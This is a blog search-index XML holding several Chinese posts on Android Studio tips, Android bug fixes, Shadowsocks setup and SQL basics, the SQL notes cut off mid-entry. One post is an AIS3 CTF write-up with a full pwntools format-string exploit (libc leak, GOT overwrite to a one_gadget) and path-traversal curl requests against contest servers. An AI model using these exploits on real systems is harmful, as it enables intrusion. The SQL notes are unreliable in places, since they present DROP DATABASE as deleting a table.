<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android Studio 技巧整理</title>
    <url>/Android-Studio%E6%8A%80%E5%B7%A7%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><p>最近開始研究 Android Studio，得知一些可以增加開發速度的小技巧，因此在這邊做一下記錄。</p><a id="more"></a><h2 id="Live-Templates">Live Templates</h2><p><code>Live Templates</code>：程式碼快速補全模板</p><p>這邊列出一些比較常見的 Live Templates，有興趣的人可以自行深入了解。</p><ul><li><code>newInstance</code> - 在 Fragment 中生成 <code>newInstance</code> 方法</li><li><code>Toast</code> - 生成 <code>Toast.makeText(context, &quot;&quot;, Toast.LENGTH_SHORT).show();</code></li><li><code>fbc</code> - 生成 findViewById</li><li><code>const</code> - 定義一個 android style int 常數</li><li><code>logd</code> - 生成 <code>Log.d(TAG, &quot;&quot;);</code></li><li><code>logm</code> - Log 當前方法名稱和參數</li><li><code>logr</code> - Log 當前方法結果</li><li><code>logt</code> - 當前類生成 log tag</li><li><code>psf</code> - public static final</li><li><code>sout</code> - 印出一個字串到 System.out</li><li><code>soutm</code> - 印出當前類名和方法到 System.out</li><li><code>soutp</code> - 印出方法參數和返回值到 System.out</li><li><code>visible</code> - 設置 view VISIBLE</li><li><code>gone</code> - 設置 view GONE</li><li><code>noInstance</code> - private 構造方法</li></ul><h2 id="Android-Studio-的自動生成">Android Studio 的自動生成</h2><p>可以使用 Android Studio 自動幫你生成一些程式碼</p><ul><li><code>&lt;expr&gt;.null</code> 轉換成 <code>if(&lt;expr&gt; == null)</code></li><li><code>&lt;expr&gt;.notnull</code> 轉換成 <code>if(&lt;expr&gt; != null)</code></li><li><code>&lt;expr&gt;.var</code> 轉換成 <code>T name = &lt;expr&gt;</code></li><li><code>&lt;expr&gt;.field</code> 會自動生成一個全局變數 <code>field = &lt;expr&gt;</code></li><li><code>&lt;ArrayExpr&gt;.for</code> 轉換成 <code>for(T item : &lt;Arrayexpr&gt;)</code></li><li><code>&lt;ArrayExpr&gt;.fori</code> 轉換成 <code>for(int i = 0; i &lt; &lt;Arrayexpr&gt;.length; i++)</code></li><li><code>&lt;ArrayExpr&gt;.forr</code> 轉換成 <code>for(int i = &lt;Arrayexpr&gt;.length - 1; i &gt; 0 ; i--)</code></li></ul><h2 id="插件">插件</h2><p>下面列出一些我正在使用的插件</p><ol><li><p><strong>Android Drawable Importer</strong><br>為了適應所有 Android 螢幕的大小和密度，每個 Android 項目都會包含 drawable 資料夾。任何具備 Android 開發經驗的開發人員都知道，為了支持所有的螢幕尺寸，你必須給每個螢幕類型導入不同的 Drawalbe。Android Drawable Importer 插件能讓這項工作變得更容易。它可以減少導入縮放圖像到 Android 項目所需的工作量。 Android Drawable Importer 添加了一個在不同分辨率導入 Drawble 或縮放指定圖像到定義分辨率的選項。這個插件加速了開發人員的 Drawable 工作。</p></li><li><p><strong>Lifecycle Sorter</strong><br>可以根據 Activity 或者 fragment 的生命週期對其生命週期方法位置進行先後排序，快捷鍵 Ctrl + alt + K。</p></li><li><p><strong>.ignore</strong><br>我們都知道在 Git 中想要過濾掉一些不想提交的文件，可以把相應的文件添加到 .gitignore 中，而 .gitignore 這個 Android Studio 插件根據不同的語言來選擇模板，就不用自己在費事添加一些文件了，而且還有自動補全功能，過濾文件再也不要復製檔名了。我們做項目的時候，並不是所有文件都是要提交的，比如構建的 build 資料夾，本地配置文件，每個 Module 生成的 iml 文件，但是我們每次 add，commit 都會不小心把它們添加上去，而 gitignore 就是解決這種痛點的，如果你不想提交的檔案，就可以在創建項目的時候將這個檔案中添加即可，將一些通用的東西屏蔽掉。</p></li><li><p><strong>Android Methods Count</strong><br>統計 Android 依賴庫中方法的總個數。 (一個 dex 只能接受的 65K 並不是指方法數超過 65K 而報的錯,而是指引用計數超過 65K)</p></li><li><p><strong>jetbrains-wakatime</strong><br>紀錄在 Android Studio 上的工作時間。</p></li><li><p><strong>Genymotion</strong><br>好用的 Android 模擬器，原生模擬器不堪用。</p></li><li><p><strong>GsonFormat</strong><br>快速將 json 字串轉換成一個 Java Bean，免去我們根據 json 字符串手寫對應 Java Bean 的過程。</p></li><li><p><strong>LayoutFormatter</strong><br>一鍵幫你將你的 XML 文件排版，並調整順序。</p></li></ol><h2 id="快捷鍵">快捷鍵</h2><p><span class="exturl" data-url="aHR0cHM6Ly9yZXNvdXJjZXMuamV0YnJhaW5zLmNvbS9zdG9yYWdlL3Byb2R1Y3RzL2ludGVsbGlqLWlkZWEvZG9jcy9JbnRlbGxpSklERUFfUmVmZXJlbmNlQ2FyZC5wZGY=">完整的快捷键指南<i class="fa fa-external-link-alt"></i></span></p><h3 id="參考資料">參考資料</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pc3J1bHovYW5kcm9pZC10aXBzLXRyaWNrcw==">nisrulz/android-tips-tricks<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly95ZG1tb2Nvby5naXRodWIuaW8vMjAxNi8wNi8yOC9BbmRyb2lkLVN0dWRpbyVFNiU4RiU5MiVFNCVCQiVCNiVFNiU5NSVCNCVFNyU5MCU4Ni8=">Android Studio插件整理<i class="fa fa-external-link-alt"></i></span></li></ul><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android Studio</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3 Final CTF - hellOwOrld</title>
    <url>/AIS3-Final-CTF-hellOwOrld/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><p>我們這隊都是第一次參加 AIS3 Final CTF，結果拿到第 18 名的成績，滿開心的ＸＤ<br>這邊整理了一些解題過程和思路，有興趣可以看一下～<br>如果有任何其他思路也歡迎在下面提出！</p><a id="more"></a><p><img data-src="https://i.imgur.com/Q2Qi8Is.png" alt=""></p><hr><h2 id="misc">misc</h2><h3 id="Painting-bot-100">Painting bot/100</h3><blockquote><p>This is an AI painting bot. Could you get the flag from the bot?<br>(Please remember to back up important files in your system.)<br>(Any loss caused by this program will not be covered by us.)</p><p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU9uNTQ2TzJrdnlxUUJXdXlObUtZcldJZW9NcVlmMXZu">http://ctf.ais3.org/files/misc1_artist.exe<i class="fa fa-external-link-alt"></i></span></p></blockquote><p>這是我原本看到題目後做的事<br>查看檔案有沒有藏東西<br><img data-src="https://i.imgur.com/7jnPoMd.png" alt=""></p><p>發現有HTML，因此用 dd 拆出來，打開後發現沒屁用<br><img data-src="https://i.imgur.com/KLZ8v8m.png" alt=""></p><blockquote><p>沒頭緒</p></blockquote><blockquote><p>其實也不需要頭緒，只要和小畫家一起打開就好，然後在他開始控制滑鼠前切到小畫家就好QwQ</p></blockquote><hr><h3 id="RPG-200">RPG/200</h3><blockquote><p>Here is a secret RPGMaker XP game. Win the game and you will get the flag!<br>If you don’t have rtp, please visit the site at<br><span class="exturl" data-url="aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGFpd2FucnBncGxheWVyL3J0cA==">https://sites.google.com/site/taiwanrpgplayer/rtp<i class="fa fa-external-link-alt"></i></span><br>and download RPG Maker XP RTP.</p><p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU9zQy1yS3dfWXpTTk1iT1hSMEhIMlU0UEJfck93Z2VY">http://ctf.ais3.org/files/misc2_rpg.exe<i class="fa fa-external-link-alt"></i></span></p></blockquote><pre><code>由於作者在開發時使用了有中文名稱的 bgm 檔案，如果跳出`沒有發現檔案 Audio/BGM/巨人`的錯誤訊息，~~恭喜你，作者排擠使用非 Big5 碼的族群~~，想辦法轉區吧 (´・ω・`)
</code></pre><p>首先，到網路上找到神奇的 rgss decrypter，把所有東西全部解出來</p><p><img data-src="https://i.imgur.com/GKo6vmp.png" alt="rgss decrypter"></p><p>接著到官網下載 RPG Maker XP 開發工具，它可以順便裝好 RTP<br>開一個新 project 把所有東西丟進去 (或是在 rgss decrypter 點 <code>Generate Game.rxproj</code>)，<br>在 end 的場景左上角會發現一個被框起來的格子 (event)<br>打開之後就會發現這一行：</p><p><img data-src="https://i.imgur.com/MMgm444.png" alt="Flaaaaaag!!"></p><p>如果把它塞進初始化的 event 裡，遊戲一開始就會跳出 flag 給你看了 OωO</p><hr><h3 id="Hat-300">Hat/300</h3><blockquote><p>Every hacker has his/her own hat! Try to customize one for yourself!</p><p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUDlkUkNYZzBFY2M5bmR5YU5JZWxZRl9td25iQ3pWeXc=">http://srv03.ctf.ais3.org:9001/<i class="fa fa-external-link-alt"></i></span></p></blockquote><p><img data-src="https://i.imgur.com/kUsr8WU.png" alt=""></p><p>聽說找到 <code>.git</code> 的資料夾可以還原兩個檔案</p><hr><h2 id="pwn">pwn</h2><h3 id="Baby-format-100">Baby format/100</h3><blockquote><p>Nothing in the world cannot be solved by a single printf. If there was, try to work with two printf’s!<br>hint: printf has buffer, and you will only see the output after the buffer is full.<br>hint2: maybe try GOT Hijack and return to main</p><p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUERhVzFmSDhqN2kwZEZVV2NGcDFaZTJzejRfQjZnQUk=">http://ctf.ais3.org/files/pwn1_fmt.7z<i class="fa fa-external-link-alt"></i></span></p><p>service is on <span class="exturl" data-url="aHR0cDovL3NydjAxLmN0Zi5haXMzLm9yZzo1NTIx">srv01.ctf.ais3.org:5521<i class="fa fa-external-link-alt"></i></span></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'srv01.ctf.ais3.org'</span></span><br><span class="line">port = <span class="number">5521</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    r = remote(host, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">'./fmt'</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400646</span></span><br><span class="line">start_main_offset = <span class="number">0x21ab0</span> + <span class="number">0xe7</span></span><br><span class="line">one_gadget = <span class="number">0x10a38c</span></span><br><span class="line">puts = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fmt_payload</span><span class="params">(value, target)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    num = num % <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> value == num:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">elif</span> value &gt; num:</span><br><span class="line">        payload = <span class="string">'%'</span> + str(value-num) + <span class="string">'c'</span> + target</span><br><span class="line">        num = value</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n = <span class="number">256</span>-num + value</span><br><span class="line">        num = value</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%'</span> + str(n) + <span class="string">'c'</span> + target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="number">73</span></span><br><span class="line">payload = <span class="string">'startLeak:%39$p:%41$p:%43$p:%69$p'</span></span><br><span class="line">payload += get_fmt_payload(<span class="number">0x46</span>, <span class="string">'%32$hhn'</span>)</span><br><span class="line">payload += get_fmt_payload(<span class="number">0x06</span>, <span class="string">'%33$hhn'</span>)</span><br><span class="line">payload += get_fmt_payload(<span class="number">0x40</span>, <span class="string">'%34$hhn'</span>)</span><br><span class="line">payload += <span class="string">'%10000c'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(puts)</span><br><span class="line">payload += p64(puts+<span class="number">0x1</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">'startLeak:'</span>)</span><br><span class="line"></span><br><span class="line">canary = int(r.recvuntil(<span class="string">':'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line">libc = int(r.recvuntil(<span class="string">':'</span>)[:<span class="number">-1</span>], <span class="number">16</span>) - start_main_offset</span><br><span class="line">ret_addr = int(r.recvuntil(<span class="string">':'</span>)[:<span class="number">-1</span>], <span class="number">16</span>) - <span class="number">0xe0</span></span><br><span class="line">print(<span class="string">'libc:'</span>, hex(libc))</span><br><span class="line">print(<span class="string">'canary:'</span>, hex(canary))</span><br><span class="line">print(<span class="string">'ret_addr:'</span>, hex(ret_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gadget = libc+one_gadget</span><br><span class="line"></span><br><span class="line">print(<span class="string">'gadget:'</span>, hex(gadget))</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">payload = get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%32$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%33$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%34$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%35$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%36$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">payload += get_fmt_payload(gadget&amp;<span class="number">0xff</span>, <span class="string">'%37$hhn'</span>)</span><br><span class="line">gadget = gadget &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(puts)</span><br><span class="line">payload += p64(puts+<span class="number">0x1</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x2</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x3</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x4</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x5</span>)</span><br><span class="line">payload += p64(puts+<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="web">web</h2><h3 id="Secret-message-100">Secret message/100</h3><blockquote><p>One secret person embeds a secret message in the website. Could you find the message?</p><p><span class="exturl" data-url="aHR0cDovL3NydjAyLmN0Zi5haXMzLm9yZzo4ODg3Lw==">http://srv02.ctf.ais3.org:8887/<i class="fa fa-external-link-alt"></i></span></p></blockquote><p><img data-src="https://i.imgur.com/pThCerf.png" alt=""></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">potocol=GET</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">while [ $i -lt 100 ]; do</span><br><span class="line">	</span><br><span class="line">	curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol &gt;&gt; flags.txt </span><br><span class="line">	potocol=$(curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol | grep Next | cut -f 2 -d ' ' | tr -d "\r")</span><br><span class="line"></span><br><span class="line">	echo &gt;&gt; flags.txt </span><br><span class="line"></span><br><span class="line">	i=$[$i+1]</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>然後我用手拼起來…</p><h4 id="Flag">Flag</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AIS3&#123;HtTpMe5h0dI5FunaNdGo0DXDdDdDDDx!&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="Reverse-proxy-200">Reverse proxy/200</h3><blockquote><p>Bob setup a simple reverse proxy, and configured some passwords.<br>Unfortunately, he lost the password. Could you please help him to find it out?<br><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUGJ1dEtMVG1vYm5MRThCZVVXVVV0TERCQmQwaUpPRWs=">http://ctf.ais3.org/files/web2_main.py<i class="fa fa-external-link-alt"></i></span></p><p><span class="exturl" data-url="aHR0cDovL3NydjAyLmN0Zi5haXMzLm9yZzo4Nzg3Lw==">http://srv02.ctf.ais3.org:8787/<i class="fa fa-external-link-alt"></i></span></p></blockquote><p>這題一開始有提供 python 的程式，可以把它執行起來，會比較好研究</p><p>在程式中可以看到，編輯中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://srv02.ctf.ais3.org:8787/%2e%2e/%2e%2e/%2e%2e/password/wa -X POST &gt; /dev/null</span><br><span class="line">curl http://srv02.ctf.ais3.org:8787/wa -X ADMIN -d 'QAQ'</span><br></pre></td></tr></table></figure><h4 id="Flag-2">Flag</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AIS3&#123;f1aSk_pr0Xy_5Erver_15_N1Ce!!&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="Invitation-letter-300">Invitation letter/300</h3><blockquote><p>Customize your own invitation letter!</p><p><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUGNPTFJVWXd3dTQtbFhDQVdBQ09xNGRMWTBGUm9pQy0=">http://srv03.ctf.ais3.org:9002/<i class="fa fa-external-link-alt"></i></span></p></blockquote><p><img data-src="https://i.imgur.com/E51MKNP.png" alt=""></p><p>==還沒解完==</p><p>robots.txt<br><span class="exturl" data-url="aHR0cDovL3NydjAzLmN0Zi5haXMzLm9yZzo5MDAyL3JvYm90cy50eHQ=">http://srv03.ctf.ais3.org:9002/robots.txt<i class="fa fa-external-link-alt"></i></span></p><p><img data-src="https://i.imgur.com/CBWqoJ4.png" alt=""></p><p>看起來是程式碼<br><span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUHM5am1BNU9Tcjh4Q2cxalJKbklJbDJqeG54ZGU1NnM=">http://srv03.ctf.ais3.org:9002/files/app.py.old_20180531<i class="fa fa-external-link-alt"></i></span></p><p>無法存取的 flag.txt<br><span class="exturl" data-url="aHR0cDovL3NydjAzLmN0Zi5haXMzLm9yZzo5MDAyL2ZpbGVzL2ZsYWcudHh0">http://srv03.ctf.ais3.org:9002/files/flag.txt<i class="fa fa-external-link-alt"></i></span></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>AIS3</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 學習問題紀錄</title>
    <url>/Android-%E5%AD%B8%E7%BF%92%E5%95%8F%E9%A1%8C%E7%B4%80%E9%8C%84/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><h2 id="紀錄-1">紀錄 1</h2><h3 id="問題">問題</h3><p>在 OkHttp 的 onResponse 中使用 Toast 會噴錯，但 Retrofit 不會。<br><a id="more"></a></p><h3 id="原因">原因</h3><p>OkHttp 不是執行在 UI Thread，但 Retrofit 是。</p><h2 id="紀錄-2">紀錄 2</h2><h3 id="問題-2">問題</h3><p>在 OkHttp 的 onResponse 中使用 Toast 會噴錯。</p><h3 id="原因-2">原因</h3><p>OkHttp 不是執行在 UI Thread。</p><h3 id="解法">解法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 解法1</span></span><br><span class="line">Handler handler = <span class="keyword">new</span> Handler(Looper.getMainLooper());</span><br><span class="line">handler.post(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 解法2</span></span><br><span class="line">activity.runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac 下使用 Shadowsocks 翻牆</title>
    <url>/Mac%E4%B8%8B%E4%BD%BF%E7%94%A8Shadowsocks%E7%BF%BB%E7%89%86/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><p>這邊教大家如何使用 ShadowsocksX-NG 來進行 Shadowsocks 代理，以達到 <strong>翻牆</strong> 效果。</p><a id="more"></a><h2 id="下載-ShadowsocksX-NG">下載 ShadowsocksX-NG</h2><p>GitHub 載點：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvd3NvY2tzL1NoYWRvd3NvY2tzWC1ORy9yZWxlYXNlcy8=">https://github.com/shadowsocks/ShadowsocksX-NG/releases/<i class="fa fa-external-link-alt"></i></span></p><p><img data-src="https://imgur.com/rputoJL.png" alt=""></p><h2 id="編輯代理伺服器">編輯代理伺服器</h2><p>點擊「紙飛機」選擇「Server」，然後點擊【Server Preferences…】選項：</p><p><img data-src="https://i.imgur.com/PjwfSrC.png" alt=""></p><p>新增 Shadowsocks 服務配置：</p><p><img data-src="https://i.imgur.com/BQM68VU.png" alt=""></p><h2 id="更改代理模式">更改代理模式</h2><p>預設模式為 <code>Proxy Auto Configure Mode</code>，這邊我們將它改為 <code>Global Mode</code>，使所有對外連線都使用 <code>Shadowsocks</code>，且無需特別設定。</p><p>如要使用 <code>Proxy Auto Configure Mode</code>，會需要額外設定，這邊就不多做敘述。</p><p><img data-src="https://i.imgur.com/FnjA0Up.png" alt=""></p><h2 id="測試是否成功">測試是否成功</h2><p>訪問 <code>orange.tw</code> 來查看自己的 IP 是否有變更。</p><p><img data-src="https://i.imgur.com/5q9MBsg.png" alt=""></p><h2 id="關閉-Shadowsocks">關閉 Shadowsocks</h2><p>點擊【Turn Shadowsocks Off】來關閉 Shadowsocks。</p><p><img data-src="https://imgur.com/k4WvIRT.png" alt=""></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Shadowsocks</category>
      </categories>
      <tags>
        <tag>MacOS</tag>
        <tag>Shadowsocks</tag>
        <tag>翻牆</tag>
      </tags>
  </entry>
  <entry>
    <title>Error：Fragment already added</title>
    <url>/Error-Fragment-already-added/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><h2 id="遇到狀況">遇到狀況</h2><pre><code>java.lang.IllegalStateException: Fragment already added
</code></pre><a id="more"></a><h2 id="原因">原因</h2><p>Fragment 在一些狀況不會正常移除</p><h2 id="原本程式碼">原本程式碼</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FragmentTransaction transaction = getFragmentManager().beginTransaction();</span><br><span class="line">transaction.replace(R.id.fragment_container, newFragment);</span><br><span class="line">transaction.addToBackStack(<span class="keyword">null</span>);</span><br><span class="line">transaction.commit();</span><br></pre></td></tr></table></figure><h2 id="解決辦法">解決辦法</h2><p>因為replace有時會出現問題，因此在使用之前先確認Fragment是否被Added。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(mFragment.isAdded())</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">return</span>; <span class="comment">//or return false/true, based on where you are calling from</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="後來程式碼">後來程式碼</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FragmentTransaction transaction = getFragmentManager().beginTransaction();</span><br><span class="line"><span class="keyword">if</span> (newFragment.isAdded()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">transaction.replace(R.id.fragment_container, newFragment);</span><br><span class="line">transaction.addToBackStack(<span class="keyword">null</span>);</span><br><span class="line">transaction.commit();</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Fragment</tag>
        <tag>Error</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 語法筆記</title>
    <url>/SQL-tutorial/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><h2 id="基本語法">基本語法</h2><h3 id="創建資料表">創建資料表</h3><p><code>CREATE TABLE</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">   column_1 data_type, </span><br><span class="line">   column_2 data_type, </span><br><span class="line">   column_3 data_type</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> celebs (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">INTEGER</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">TEXT</span>, </span><br><span class="line">    age <span class="built_in">INTEGER</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> celebs (</span><br><span class="line">   <span class="keyword">id</span> <span class="built_in">INTEGER</span> PRIMARY <span class="keyword">KEY</span>, </span><br><span class="line">   <span class="keyword">name</span> <span class="built_in">TEXT</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">   date_of_birth <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   date_of_death <span class="built_in">TEXT</span> <span class="keyword">DEFAULT</span> <span class="string">'Not Applicable'</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ol><li><p><code>PRIMARY KEY</code>：可用於資料的唯一識別，不能重複，一個資料只能有一個欄位是 <code>PRIMARY KEY</code>。</p></li><li><p><code>UNIQUE</code>：與 <code>PRIMARY KEY</code> 很像，不過它可以設置在一個資料的多個欄位</p></li><li><p><code>NOT NULL</code>：強制該欄位一定要給定值</p></li><li><p><code>DEFAULT</code>：如果欄位沒有值，會自動定預設值</p></li></ol><a id="more"></a><h3 id="刪除資料表">刪除資料表</h3><p><code>DROP DATABASE</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> table_name;</span><br></pre></td></tr></table></figure><h3 id="新增資料">新增資料</h3><p><code>INSERT INTO</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (<span class="keyword">id</span>, <span class="keyword">name</span>, age)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">'Justin Bieber'</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure><h3 id="資料表查詢">資料表查詢</h3><p><code>SELECT</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure><h3 id="更新資料">更新資料</h3><p><code>UPDATE</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> celebs</span><br><span class="line"><span class="keyword">SET</span> age = <span class="number">22</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="改變資料表欄位">改變資料表欄位</h3><p><code>ALTER TABLE</code></p><ul><li>新增欄位<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> celebs </span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">COLUMN</span> twitter_handle <span class="built_in">TEXT</span>;</span><br></pre></td></tr></table></figure></li><li>刪除欄位<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> celebs</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> twitter_handle;</span><br></pre></td></tr></table></figure></li><li>修改欄位<ul><li>SQL Server / MS Access<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> celebs</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> twitter_handle <span class="built_in">INTEGER</span>;</span><br></pre></td></tr></table></figure></li><li>My SQL / Oracle (prior version 